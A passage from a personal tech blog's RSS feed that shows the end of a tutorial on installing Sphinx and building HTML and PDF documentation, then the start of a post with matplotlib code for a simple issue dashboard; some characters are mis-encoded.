warning: no files found matching <span style="color:#ed9d13">&#39;MANIFEST&#39;</span>
warning: no files found matching <span style="color:#ed9d13">&#39;*&#39;</span> under directory <span style="color:#ed9d13">&#39;extras&#39;</span>
warning: no previously-included files matching <span style="color:#ed9d13">&#39;.cvsignore&#39;</span> found under directory <span style="color:#ed9d13">&#39;*&#39;</span>
warning: no previously-included files matching <span style="color:#ed9d13">&#39;*.pyc&#39;</span> found under directory <span style="color:#ed9d13">&#39;*&#39;</span>
warning: no previously-included files matching <span style="color:#ed9d13">&#39;*~&#39;</span> found under directory <span style="color:#ed9d13">&#39;*&#39;</span>
warning: no previously-included files matching <span style="color:#ed9d13">&#39;.DS_Store&#39;</span> found under directory <span style="color:#ed9d13">&#39;*&#39;</span>
Downloading/unpacking Jinja2&gt;=2.3 (from sphinx)
  Downloading Jinja2-2.7.2.tar.gz (378kB): 378kB downloaded
  Running setup.py (path:/home/victor/tmp/doku/build/Jinja2/setup.py) egg_info <span style="color:#6ab825;font-weight:bold">for</span> package Jinja2

warning: no files found matching <span style="color:#ed9d13">&#39;*&#39;</span> under directory <span style="color:#ed9d13">&#39;custom_fixers&#39;</span>
warning: no previously-included files matching <span style="color:#ed9d13">&#39;*&#39;</span> found under directory <span style="color:#ed9d13">&#39;docs/_build&#39;</span>
warning: no previously-included files matching <span style="color:#ed9d13">&#39;*.pyc&#39;</span> found under directory <span style="color:#ed9d13">&#39;jinja2&#39;</span>
warning: no previously-included files matching <span style="color:#ed9d13">&#39;*.pyc&#39;</span> found under directory <span style="color:#ed9d13">&#39;docs&#39;</span>
warning: no previously-included files matching <span style="color:#ed9d13">&#39;*.pyo&#39;</span> found under directory <span style="color:#ed9d13">&#39;jinja2&#39;</span>
warning: no previously-included files matching <span style="color:#ed9d13">&#39;*.pyo&#39;</span> found under directory <span style="color:#ed9d13">&#39;docs&#39;</span>
Downloading/unpacking Pygments&gt;=1.2 (from sphinx)
  Downloading Pygments-1.6.tar.gz (1.4MB): 1.4MB downloaded
  Running setup.py (path:/home/victor/tmp/doku/build/Pygments/setup.py) egg_info <span style="color:#6ab825;font-weight:bold">for</span> package Pygments

Downloading/unpacking markupsafe (from Jinja2&gt;=2.3-&gt;sphinx)
  Downloading MarkupSafe-0.21.tar.gz
  Running setup.py (path:/home/victor/tmp/doku/build/markupsafe/setup.py) egg_info <span style="color:#6ab825;font-weight:bold">for</span> package markupsafe

Installing collected packages: sphinx, docutils, Jinja2, Pygments, markupsafe
  Running setup.py install <span style="color:#6ab825;font-weight:bold">for</span> docutils
Skipping implicit fixer: buffer
Skipping implicit fixer: idioms
Skipping implicit fixer: set_literal
Skipping implicit fixer: ws_comma
copy/convert <span style="color:#24909d">test</span> suite
changing mode of build/scripts-3.4/rst2html.py from <span style="color:#3677a9">644</span> to <span style="color:#3677a9">755</span>
changing mode of build/scripts-3.4/rst2s5.py from <span style="color:#3677a9">644</span> to <span style="color:#3677a9">755</span>
changing mode of build/scripts-3.4/rst2latex.py from <span style="color:#3677a9">644</span> to <span style="color:#3677a9">755</span>
changing mode of build/scripts-3.4/rst2xetex.py from <span style="color:#3677a9">644</span> to <span style="color:#3677a9">755</span>
changing mode of build/scripts-3.4/rst2man.py from <span style="color:#3677a9">644</span> to <span style="color:#3677a9">755</span>
changing mode of build/scripts-3.4/rst2xml.py from <span style="color:#3677a9">644</span> to <span style="color:#3677a9">755</span>
changing mode of build/scripts-3.4/rst2pseudoxml.py from <span style="color:#3677a9">644</span> to <span style="color:#3677a9">755</span>
changing mode of build/scripts-3.4/rstpep2html.py from <span style="color:#3677a9">644</span> to <span style="color:#3677a9">755</span>
changing mode of build/scripts-3.4/rst2odt.py from <span style="color:#3677a9">644</span> to <span style="color:#3677a9">755</span>
changing mode of build/scripts-3.4/rst2odt_prepstyles.py from <span style="color:#3677a9">644</span> to <span style="color:#3677a9">755</span>

warning: no files found matching <span style="color:#ed9d13">&#39;MANIFEST&#39;</span>
warning: no files found matching <span style="color:#ed9d13">&#39;*&#39;</span> under directory <span style="color:#ed9d13">&#39;extras&#39;</span>
warning: no previously-included files matching <span style="color:#ed9d13">&#39;.cvsignore&#39;</span> found under directory <span style="color:#ed9d13">&#39;*&#39;</span>
warning: no previously-included files matching <span style="color:#ed9d13">&#39;*.pyc&#39;</span> found under directory <span style="color:#ed9d13">&#39;*&#39;</span>
warning: no previously-included files matching <span style="color:#ed9d13">&#39;*~&#39;</span> found under directory <span style="color:#ed9d13">&#39;*&#39;</span>
warning: no previously-included files matching <span style="color:#ed9d13">&#39;.DS_Store&#39;</span> found under directory <span style="color:#ed9d13">&#39;*&#39;</span>
changing mode of /home/victor/tmp/doku/bin/rstpep2html.py to <span style="color:#3677a9">755</span>
changing mode of /home/victor/tmp/doku/bin/rst2xml.py to <span style="color:#3677a9">755</span>
changing mode of /home/victor/tmp/doku/bin/rst2pseudoxml.py to <span style="color:#3677a9">755</span>
changing mode of /home/victor/tmp/doku/bin/rst2html.py to <span style="color:#3677a9">755</span>
changing mode of /home/victor/tmp/doku/bin/rst2odt_prepstyles.py to <span style="color:#3677a9">755</span>
changing mode of /home/victor/tmp/doku/bin/rst2latex.py to <span style="color:#3677a9">755</span>
changing mode of /home/victor/tmp/doku/bin/rst2man.py to <span style="color:#3677a9">755</span>
changing mode of /home/victor/tmp/doku/bin/rst2odt.py to <span style="color:#3677a9">755</span>
changing mode of /home/victor/tmp/doku/bin/rst2xetex.py to <span style="color:#3677a9">755</span>
changing mode of /home/victor/tmp/doku/bin/rst2s5.py to <span style="color:#3677a9">755</span>
  Running setup.py install <span style="color:#6ab825;font-weight:bold">for</span> Jinja2

warning: no files found matching <span style="color:#ed9d13">&#39;*&#39;</span> under directory <span style="color:#ed9d13">&#39;custom_fixers&#39;</span>
warning: no previously-included files matching <span style="color:#ed9d13">&#39;*&#39;</span> found under directory <span style="color:#ed9d13">&#39;docs/_build&#39;</span>
warning: no previously-included files matching <span style="color:#ed9d13">&#39;*.pyc&#39;</span> found under directory <span style="color:#ed9d13">&#39;jinja2&#39;</span>
warning: no previously-included files matching <span style="color:#ed9d13">&#39;*.pyc&#39;</span> found under directory <span style="color:#ed9d13">&#39;docs&#39;</span>
warning: no previously-included files matching <span style="color:#ed9d13">&#39;*.pyo&#39;</span> found under directory <span style="color:#ed9d13">&#39;jinja2&#39;</span>
warning: no previously-included files matching <span style="color:#ed9d13">&#39;*.pyo&#39;</span> found under directory <span style="color:#ed9d13">&#39;docs&#39;</span>
  Running setup.py install <span style="color:#6ab825;font-weight:bold">for</span> Pygments
Skipping implicit fixer: buffer
Skipping implicit fixer: idioms
Skipping implicit fixer: set_literal
Skipping implicit fixer: ws_comma

Installing pygmentize script to /home/victor/tmp/doku/bin
  Running setup.py install <span style="color:#6ab825;font-weight:bold">for</span> markupsafe

building <span style="color:#ed9d13">&#39;markupsafe._speedups&#39;</span> extension
gcc -pthread -Wno-unused-result -Werror=declaration-after-statement -DDYNAMIC_ANNOTATIONS_ENABLED=<span style="color:#3677a9">1</span> -DNDEBUG -g -fwrapv -O3 -Wall -Wstrict-prototypes -march=x86-64 -mtune=generic -O2 -pipe -fstack-protector --param=ssp-buffer-size=<span style="color:#3677a9">4</span> -fPIC -I/usr/include/python3.4m -c markupsafe/_speedups.c -o build/temp.linux-x86_64-3.4/markupsafe/_speedups.o
gcc -pthread -shared -Wl,-O1,--sort-common,--as-needed,-z,relro build/temp.linux-x86_64-3.4/markupsafe/_speedups.o -L/usr/lib -lpython3.4m -o build/lib.linux-x86_64-3.4/markupsafe/_speedups.cpython-34m.so
Successfully installed sphinx docutils Jinja2 Pygments markupsafe
Cleaning up...
(doku) doku
</code></pre></div><p>Now you should be ready to go.</p>
<h3 id="create-new-documentation-dir-structure">Create new documentation dir structure</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">(doku)Ã¢ÂžÂœ  doku  mkdir my_documentation
(doku)Ã¢ÂžÂœ  doku  sphinx-quickstart
Welcome to the Sphinx 1.2.2 quickstart utility.

Please enter values <span style="color:#6ab825;font-weight:bold">for</span> the following settings (just press Enter to
accept a default value, <span style="color:#6ab825;font-weight:bold">if</span> one is given in brackets).

Enter the root path <span style="color:#6ab825;font-weight:bold">for</span> documentation.
&gt; Root path <span style="color:#6ab825;font-weight:bold">for</span> the documentation [.]: my_documentation

You have two options <span style="color:#6ab825;font-weight:bold">for</span> placing the build directory <span style="color:#6ab825;font-weight:bold">for</span> Sphinx output.
Either, you use a directory <span style="color:#ed9d13">&#34;_build&#34;</span> within the root path, or you separate
<span style="color:#ed9d13">&#34;source&#34;</span> and <span style="color:#ed9d13">&#34;build&#34;</span> directories within the root path.
&gt; Separate <span style="color:#24909d">source</span> and build directories (y/n) [n]: n

Inside the root directory, two more directories will be created; <span style="color:#ed9d13">&#34;_templates&#34;</span>
<span style="color:#6ab825;font-weight:bold">for</span> custom HTML templates and <span style="color:#ed9d13">&#34;_static&#34;</span> <span style="color:#6ab825;font-weight:bold">for</span> custom stylesheets and other static
files. You can enter another prefix (such as <span style="color:#ed9d13">&#34;.&#34;</span>) to replace the underscore.
&gt; Name prefix <span style="color:#6ab825;font-weight:bold">for</span> templates and static dir [_]:

The project name will occur in several places in the built documentation.
&gt; Project name: My Documentation
&gt; Author name(s): Victor

Sphinx has the notion of a <span style="color:#ed9d13">&#34;version&#34;</span> and a <span style="color:#ed9d13">&#34;release&#34;</span> <span style="color:#6ab825;font-weight:bold">for</span> the
software. Each version can have multiple releases. For example, <span style="color:#6ab825;font-weight:bold">for</span>
Python the version is something like 2.5 or 3.0, <span style="color:#6ab825;font-weight:bold">while</span> the release is
something like 2.5.1 or 3.0a1.  If you don<span style="color:#ed9d13">&#39;t need this dual structure,
</span><span style="color:#ed9d13">just set both to the same value.
</span><span style="color:#ed9d13">&gt; Project version: 0.1
</span><span style="color:#ed9d13">&gt; Project release [0.1]: 0.1.0
</span><span style="color:#ed9d13">
</span><span style="color:#ed9d13">The file name suffix for source files. Commonly, this is either &#34;.txt&#34;
</span><span style="color:#ed9d13">or &#34;.rst&#34;.  Only files with this suffix are considered documents.
</span><span style="color:#ed9d13">&gt; Source file suffix [.rst]:
</span><span style="color:#ed9d13">
</span><span style="color:#ed9d13">One document is special in that it is considered the top node of the
</span><span style="color:#ed9d13">&#34;contents tree&#34;, that is, it is the root of the hierarchical structure
</span><span style="color:#ed9d13">of the documents. Normally, this is &#34;index&#34;, but if your &#34;index&#34;
</span><span style="color:#ed9d13">document is a custom template, you can also set this to another filename.
</span><span style="color:#ed9d13">&gt; Name of your master document (without suffix) [index]:
</span><span style="color:#ed9d13">
</span><span style="color:#ed9d13">Sphinx can also add configuration for epub output:
</span><span style="color:#ed9d13">&gt; Do you want to use the epub builder (y/n) [n]: n
</span><span style="color:#ed9d13">
</span><span style="color:#ed9d13">Please indicate if you want to use one of the following Sphinx extensions:
</span><span style="color:#ed9d13">&gt; autodoc: automatically insert docstrings from modules (y/n) [n]: y
</span><span style="color:#ed9d13">&gt; doctest: automatically test code snippets in doctest blocks (y/n) [n]: n
</span><span style="color:#ed9d13">&gt; intersphinx: link between Sphinx documentation of different projects (y/n) [n]: n
</span><span style="color:#ed9d13">&gt; todo: write &#34;todo&#34; entries that can be shown or hidden on build (y/n) [n]: n
</span><span style="color:#ed9d13">&gt; coverage: checks for documentation coverage (y/n) [n]: n
</span><span style="color:#ed9d13">&gt; pngmath: include math, rendered as PNG images (y/n) [n]: n
</span><span style="color:#ed9d13">&gt; mathjax: include math, rendered in the browser by MathJax (y/n) [n]: n
</span><span style="color:#ed9d13">&gt; ifconfig: conditional inclusion of content based on config values (y/n) [n]: n
</span><span style="color:#ed9d13">&gt; viewcode: include links to the source code of documented Python objects (y/n) [n]: n
</span><span style="color:#ed9d13">
</span><span style="color:#ed9d13">A Makefile and a Windows command file can be generated for you so that you
</span><span style="color:#ed9d13">only have to run e.g. `make html&#39;</span> instead of invoking sphinx-build
directly.
&gt; Create Makefile? (y/n) [y]:
&gt; Create Windows <span style="color:#24909d">command</span> file? (y/n) [y]: n

Creating file my_documentation/conf.py.
Creating file my_documentation/index.rst.
Creating file my_documentation/Makefile.

Finished: An initial directory structure has been created.

You should now populate your master file my_documentation/index.rst and create other documentation
<span style="color:#24909d">source</span> files. Use the Makefile to build the docs, like so:
   make builder
where <span style="color:#ed9d13">&#34;builder&#34;</span> is one of the supported builders, e.g. html, latex or linkcheck.
</code></pre></div><h3 id="create-some-builds">Create some builds</h3>
<p>Now you can call <strong>make</strong> to build your desired documentation format:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">(doku)Ã¢ÂžÂœ  my_documentation  make
Please use <span style="color:#ed9d13">`</span>make &lt;target&gt;<span style="color:#a61717;background-color:#e3d2d2">&#39;</span> where &lt;target&gt; is one of
  html       to make standalone HTML files
  dirhtml    to make HTML files named index.html in directories
  singlehtml to make a single large HTML file
  pickle     to make pickle files
  json       to make JSON files
  htmlhelp   to make HTML files and a HTML <span style="color:#24909d">help</span> project
  qthelp     to make HTML files and a qthelp project
  devhelp    to make HTML files and a Devhelp project
  epub       to make an epub
  latex      to make LaTeX files, you can <span style="color:#24909d">set</span> <span style="color:#40ffff">PAPER</span>=a4 or <span style="color:#40ffff">PAPER</span>=letter
  latexpdf   to make LaTeX files and run them through pdflatex
  latexpdfja to make LaTeX files and run them through platex/dvipdfmx
  text       to make text files
  man        to make manual pages
  texinfo    to make Texinfo files
  info       to make Texinfo files and run them through makeinfo
  gettext    to make PO message catalogs
  changes    to make an overview of all changed/added/deprecated items
  xml        to make Docutils-native XML files
  pseudoxml  to make pseudoxml-XML files <span style="color:#6ab825;font-weight:bold">for</span> display purposes
  linkcheck  to check all external links <span style="color:#6ab825;font-weight:bold">for</span> integrity
  doctest    to run all doctests embedded in the documentation (<span style="color:#6ab825;font-weight:bold">if</span> enabled)
</code></pre></div><p>Let&rsquo;s try with <strong>html</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">(doku)Ã¢ÂžÂœ  my_documentation  make html
sphinx-build -b html -d _build/doctrees   . _build/html
Making output directory...
Running Sphinx v1.2.2
loading pickled environment... failed: [Errno 2] No such file or directory: <span style="color:#ed9d13">&#39;/home/victor/tmp/doku/my_documentation/_build/doctrees/environment.pickle&#39;</span>
building [html]: targets <span style="color:#6ab825;font-weight:bold">for</span> <span style="color:#3677a9">1</span> <span style="color:#24909d">source</span> files that are out of date
updating environment: <span style="color:#3677a9">1</span> added, <span style="color:#3677a9">0</span> changed, <span style="color:#3677a9">0</span> removed
reading sources... [100%] index
looking <span style="color:#6ab825;font-weight:bold">for</span> now-outdated files... none found
pickling environment... <span style="color:#6ab825;font-weight:bold">done</span>
checking consistency... <span style="color:#6ab825;font-weight:bold">done</span>
preparing documents... <span style="color:#6ab825;font-weight:bold">done</span>
writing output... [100%] index
writing additional files... genindex search
copying static files... <span style="color:#6ab825;font-weight:bold">done</span>
copying extra files... <span style="color:#6ab825;font-weight:bold">done</span>
dumping search index... <span style="color:#6ab825;font-weight:bold">done</span>
dumping object inventory... <span style="color:#6ab825;font-weight:bold">done</span>
build succeeded.

Build finished. The HTML pages are in _build/html.
</code></pre></div><p>How about <strong>PDF</strong>?</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">(doku)Ã¢ÂžÂœ  my_documentation  make latexpdf
sphinx-build -b latex -d _build/doctrees   . _build/latex
Making output directory...
Running Sphinx v1.2.2
loading pickled environment... <span style="color:#6ab825;font-weight:bold">done</span>
building [latex]: all documents
updating environment: <span style="color:#3677a9">0</span> added, <span style="color:#3677a9">0</span> changed, <span style="color:#3677a9">0</span> removed
looking <span style="color:#6ab825;font-weight:bold">for</span> now-outdated files... none found
processing MyDocumentation.tex... index
resolving references...
writing... <span style="color:#6ab825;font-weight:bold">done</span>
copying TeX support files...
<span style="color:#6ab825;font-weight:bold">done</span>
build succeeded.
Running LaTeX files through pdflatex...
make -C _build/latex all-pdf
make[1]: Entering directory <span style="color:#ed9d13">&#39;/home/victor/tmp/doku/my_documentation/_build/latex&#39;</span>
...
Transcript written on MyDocumentation.log.
make[1]: Leaving directory <span style="color:#ed9d13">&#39;/home/victor/tmp/doku/my_documentation/_build/latex&#39;</span>
pdflatex finished; the PDF files are in _build/latex.
</code></pre></div><p>You can find you <strong>builds</strong> inside the <strong>_build</strong> folder:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">(doku)Ã¢ÂžÂœ  my_documentation  tree _build
_build
Ã¢Â”ÂœÃ¢Â”Â€Ã¢Â”Â€ doctrees
Ã¢Â”Â‚Â Â  Ã¢Â”ÂœÃ¢Â”Â€Ã¢Â”Â€ environment.pickle
Ã¢Â”Â‚Â Â  Ã¢Â”Â”Ã¢Â”Â€Ã¢Â”Â€ index.doctree
Ã¢Â”ÂœÃ¢Â”Â€Ã¢Â”Â€ html
Ã¢Â”Â‚Â Â  Ã¢Â”ÂœÃ¢Â”Â€Ã¢Â”Â€ genindex.html
Ã¢Â”Â‚Â Â  Ã¢Â”ÂœÃ¢Â”Â€Ã¢Â”Â€ index.html
Ã¢Â”Â‚Â Â  Ã¢Â”ÂœÃ¢Â”Â€Ã¢Â”Â€ objects.inv
Ã¢Â”Â‚Â Â  Ã¢Â”ÂœÃ¢Â”Â€Ã¢Â”Â€ search.html
Ã¢Â”Â‚Â Â  Ã¢Â”ÂœÃ¢Â”Â€Ã¢Â”Â€ searchindex.js
Ã¢Â”Â‚Â Â  Ã¢Â”ÂœÃ¢Â”Â€Ã¢Â”Â€ _sources
Ã¢Â”Â‚Â Â  Ã¢Â”Â‚Â Â  Ã¢Â”Â”Ã¢Â”Â€Ã¢Â”Â€ index.txt
Ã¢Â”Â‚Â Â  Ã¢Â”Â”Ã¢Â”Â€Ã¢Â”Â€ _static
Ã¢Â”Â‚Â Â      Ã¢Â”ÂœÃ¢Â”Â€Ã¢Â”Â€ ajax-loader.gif
Ã¢Â”Â‚Â Â      Ã¢Â”ÂœÃ¢Â”Â€Ã¢Â”Â€ basic.css
Ã¢Â”Â‚Â Â      Ã¢Â”ÂœÃ¢Â”Â€Ã¢Â”Â€ comment-bright.png
Ã¢Â”Â‚Â Â      Ã¢Â”ÂœÃ¢Â”Â€Ã¢Â”Â€ comment-close.png
Ã¢Â”Â‚Â Â      Ã¢Â”ÂœÃ¢Â”Â€Ã¢Â”Â€ comment.png
Ã¢Â”Â‚Â Â      Ã¢Â”ÂœÃ¢Â”Â€Ã¢Â”Â€ default.css
Ã¢Â”Â‚Â Â      Ã¢Â”ÂœÃ¢Â”Â€Ã¢Â”Â€ doctools.js
Ã¢Â”Â‚Â Â      Ã¢Â”ÂœÃ¢Â”Â€Ã¢Â”Â€ down.png
Ã¢Â”Â‚Â Â      Ã¢Â”ÂœÃ¢Â”Â€Ã¢Â”Â€ down-pressed.png
Ã¢Â”Â‚Â Â      Ã¢Â”ÂœÃ¢Â”Â€Ã¢Â”Â€ file.png
Ã¢Â”Â‚Â Â      Ã¢Â”ÂœÃ¢Â”Â€Ã¢Â”Â€ jquery.js
Ã¢Â”Â‚Â Â      Ã¢Â”ÂœÃ¢Â”Â€Ã¢Â”Â€ minus.png
Ã¢Â”Â‚Â Â      Ã¢Â”ÂœÃ¢Â”Â€Ã¢Â”Â€ plus.png
Ã¢Â”Â‚Â Â      Ã¢Â”ÂœÃ¢Â”Â€Ã¢Â”Â€ pygments.css
Ã¢Â”Â‚Â Â      Ã¢Â”ÂœÃ¢Â”Â€Ã¢Â”Â€ searchtools.js
Ã¢Â”Â‚Â Â      Ã¢Â”ÂœÃ¢Â”Â€Ã¢Â”Â€ sidebar.js
Ã¢Â”Â‚Â Â      Ã¢Â”ÂœÃ¢Â”Â€Ã¢Â”Â€ underscore.js
Ã¢Â”Â‚Â Â      Ã¢Â”ÂœÃ¢Â”Â€Ã¢Â”Â€ up.png
Ã¢Â”Â‚Â Â      Ã¢Â”ÂœÃ¢Â”Â€Ã¢Â”Â€ up-pressed.png
Ã¢Â”Â‚Â Â      Ã¢Â”Â”Ã¢Â”Â€Ã¢Â”Â€ websupport.js
Ã¢Â”Â”Ã¢Â”Â€Ã¢Â”Â€ latex
    Ã¢Â”ÂœÃ¢Â”Â€Ã¢Â”Â€ fncychap.sty
    Ã¢Â”ÂœÃ¢Â”Â€Ã¢Â”Â€ Makefile
    Ã¢Â”ÂœÃ¢Â”Â€Ã¢Â”Â€ MyDocumentation.aux
    Ã¢Â”ÂœÃ¢Â”Â€Ã¢Â”Â€ MyDocumentation.idx
    Ã¢Â”ÂœÃ¢Â”Â€Ã¢Â”Â€ MyDocumentation.ilg
    Ã¢Â”ÂœÃ¢Â”Â€Ã¢Â”Â€ MyDocumentation.ind
    Ã¢Â”ÂœÃ¢Â”Â€Ã¢Â”Â€ MyDocumentation.log
    Ã¢Â”ÂœÃ¢Â”Â€Ã¢Â”Â€ MyDocumentation.out
    Ã¢Â”ÂœÃ¢Â”Â€Ã¢Â”Â€ MyDocumentation.pdf
    Ã¢Â”ÂœÃ¢Â”Â€Ã¢Â”Â€ MyDocumentation.tex
    Ã¢Â”ÂœÃ¢Â”Â€Ã¢Â”Â€ MyDocumentation.toc
    Ã¢Â”ÂœÃ¢Â”Â€Ã¢Â”Â€ python.ist
    Ã¢Â”ÂœÃ¢Â”Â€Ã¢Â”Â€ sphinxhowto.cls
    Ã¢Â”ÂœÃ¢Â”Â€Ã¢Â”Â€ sphinxmanual.cls
    Ã¢Â”ÂœÃ¢Â”Â€Ã¢Â”Â€ sphinx.sty
    Ã¢Â”Â”Ã¢Â”Â€Ã¢Â”Â€ tabulary.sty
</code></pre></div><p>You can easily customize the output of your PDF (when dealing with LaTeX). Just have a look at Pedros <a href="http://pedrokroger.net/using-sphinx-write-technical-books/">tips</a>
how to do that. However if you don&rsquo;t want to use LaTeX to generate your PDF, you could also have a look at <a href="https://code.google.com/p/rst2pdf/">rst2pdf</a>
which will convert your RST file into some PDF. <strong>Attention</strong>: <strong>rst2pdf</strong> is <strong>not</strong> available for Python <strong>3</strong>.x!</p>
<h2 id="themes">Themes</h2>
<p>Although I like to use PDFs when generating my documentation, HTML file are also fine. Make sure you have a look at <a href="http://sphinx-doc.org/theming.html">how</a>
themes are used. There are some basic themes provided within sphinx itself, but you can also create your own <a href="http://sphinx-doc.org/theming.html#creating-themes">ones</a>.
Also search for themes: <a href="https://github.com/search?q=sphinx+theme&amp;ref=cmdform">GitHub is your friend!</a></p>
<h2 id="conclusion">Conclusion</h2>
<p>You can use <strong>sphinx</strong> to generate all kind of documentation. Examples:</p>
<ul>
<li><a href="https://github.com/AndreasHeger/sphinx-report">Reports</a></li>
<li><a href="http://pedrokroger.net/using-sphinx-write-technical-books/">Books</a></li>
<li><a href="http://bartaz.github.io/impress.js/#/bored">Presentations</a> (using <a href="https://github.com/bartaz/impress.js/">impress.js</a>)</li>
<li>Create diagrams: <a href="http://sphinx-doc.org/ext/graphviz.html">graphviz</a> or <a href="http://blockdiag.com/en/blockdiag/sphinxcontrib.html">blockdiag</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>Unfancy dashboard using matplotlib</title>
      <link>https://blog.dornea.nu/2014/03/07/unfancy-dashboard-using-matplotlib/</link>
      <pubDate>Fri, 07 Mar 2014 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2014/03/07/unfancy-dashboard-using-matplotlib/</guid>
      <content:encoded><![CDATA[<p>I was recently playing around with <a href="http://d3js.org/">D3</a>Ã‚Â and discovered its dashboard posibilities.<a href="http://dashboarddude.com/"> dashboarddude.com</a>Ã‚Â has a nice compilation of really fancy dashboards (I was mainly interested in D3 but voila&hellip; there are also other ways to do it).</p>
<p>Meanwhile I was remembered of old good <a href="http://ipython.org/notebook">IPython Notebook</a>Â and its plotting features. This is what came out (You can find the code also on <strong>Github Gist</strong>: <a href="https://gist.github.com/dorneanu/9407737">https://gist.github.com/dorneanu/9407737</a>):</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">datetime</span> <span style="color:#6ab825;font-weight:bold">as</span> <span style="color:#447fcf;text-decoration:underline">dt</span>
<span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">matplotlib.dates</span> <span style="color:#6ab825;font-weight:bold">as</span> <span style="color:#447fcf;text-decoration:underline">mdates</span>
<span style="color:#6ab825;font-weight:bold">from</span> <span style="color:#447fcf;text-decoration:underline">mpl_toolkits.axes_grid.axislines</span> <span style="color:#6ab825;font-weight:bold">import</span> Subplot
<span style="color:#6ab825;font-weight:bold">from</span> <span style="color:#447fcf;text-decoration:underline">time</span> <span style="color:#6ab825;font-weight:bold">import</span> sleep

%matplotlib inline

<span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">gen_dashboard</span>():
    <span style="color:#999;font-style:italic"># Generate months</span>
    months = []
    <span style="color:#6ab825;font-weight:bold">for</span> i <span style="color:#6ab825;font-weight:bold">in</span> <span style="color:#24909d">range</span>(<span style="color:#3677a9">1</span>,<span style="color:#3677a9">13</span>):
        months.append((i, datetime.date(<span style="color:#3677a9">2013</span>, i, <span style="color:#3677a9">1</span>).strftime(<span style="color:#ed9d13">&#39;%Y-%m&#39;</span>)))

    <span style="color:#999;font-style:italic"># Generate data</span>
    t_fixed = np.random.randint(<span style="color:#3677a9">50</span>, size=<span style="color:#24909d">len</span>(months))
    t_closed = np.random.randint(<span style="color:#3677a9">100</span>, size=<span style="color:#24909d">len</span>(months))
    t_open = np.random.randint(<span style="color:#3677a9">100</span>, size=<span style="color:#24909d">len</span>(months))
    t_wip = np.random.randint(<span style="color:#3677a9">50</span>, size=<span style="color:#24909d">len</span>(months))
    t_wfix = np.random.randint(<span style="color:#3677a9">50</span>, size=<span style="color:#24909d">len</span>(months))

    <span style="color:#999;font-style:italic"># Set x axis</span>
    x = np.array([i[<span style="color:#3677a9">1</span>] <span style="color:#6ab825;font-weight:bold">for</span> i <span style="color:#6ab825;font-weight:bold">in</span> months])
    x = np.array([datetime.datetime(<span style="color:#3677a9">2013</span>, <span style="color:#3677a9">9</span>, <span style="color:#3677a9">28</span>, i, <span style="color:#3677a9">0</span>) <span style="color:#6ab825;font-weight:bold">for</span> i <span style="color:#6ab825;font-weight:bold">in</span> <span style="color:#24909d">range</span>(<span style="color:#3677a9">12</span>)])
    x = [dt.datetime.strptime(i[<span style="color:#3677a9">1</span>],<span style="color:#ed9d13">&#39;%Y-%m&#39;</span>).date() <span style="color:#6ab825;font-weight:bold">for</span> i <span style="color:#6ab825;font-weight:bold">in</span> months]

    <span style="color:#999;font-style:italic"># Create matplotlib figures</span>
    my_dpi = <span style="color:#3677a9">80</span>

    <span style="color:#999;font-style:italic">### Fig 1 ##########################################################</span>
    fig1 = plt.figure(<span style="color:#3677a9">0</span>,figsize=(<span style="color:#3677a9">2000</span>/my_dpi, <span style="color:#3677a9">900</span>/my_dpi), dpi=my_dpi)
    fig1.add_subplot(<span style="color:#3677a9">221</span>)
    plt.plot(x, t_fixed, marker=<span style="color:#ed9d13">&#39;*&#39;</span>, linestyle=<span style="color:#ed9d13">&#39;-&#39;</span>, color=<span style="color:#ed9d13">&#39;g&#39;</span>, label=<span style="color:#ed9d13">&#39;Fixed&#39;</span>)
    plt.plot(x, t_closed, marker=<span style="color:#ed9d13">&#39;*&#39;</span>, linestyle=<span style="color:#ed9d13">&#39;--&#39;</span>, color=<span style="color:#ed9d13">&#39;b&#39;</span>, label=<span style="color:#ed9d13">&#39;Closed&#39;</span>)
    plt.fill_between(x,t_closed,<span style="color:#3677a9">0</span>,color=<span style="color:#ed9d13">&#39;green&#39;</span>)
    plt.fill_between(x,t_fixed,<span style="color:#3677a9">0</span>,color=<span style="color:#ed9d13">&#39;black&#39;</span>)

    <span style="color:#999;font-style:italic"># Some dates settings</span>
    plt.gca().xaxis.set_major_formatter(mdates.DateFormatter(<span style="color:#ed9d13">&#39;%Y-%m&#39;</span>))
    plt.gca().xaxis.set_major_locator(mdates.MonthLocator())

    <span style="color:#999;font-style:italic"># Label axis</span>
    plt.xlabel(<span style="color:#ed9d13">&#39;Datum&#39;</span>)
    plt.ylabel(<span style="color:#ed9d13">&#39;# Issues&#39;</span>)
    plt.legend(loc=<span style="color:#ed9d13">&#34;upper right&#34;</span>)
    plt.grid(<span style="color:#6ab825;font-weight:bold">True</span>)

    <span style="color:#999;font-style:italic">### Fig 2 ##########################################################</span>
    fig2 = figure(<span style="color:#3677a9">0</span>, figsize=(<span style="color:#3677a9">2000</span>/my_dpi, <span style="color:#3677a9">2000</span>/my_dpi), dpi=my_dpi)
    fig2.add_subplot(<span style="color:#3677a9">222</span>)
    plt.plot(x, t_wip, linestyle=<span style="color:#ed9d13">&#39;--&#39;</span>, color=<span style="color:#ed9d13">&#39;b&#39;</span>, label=<span style="color:#ed9d13">&#39;Work in progress&#39;</span>)
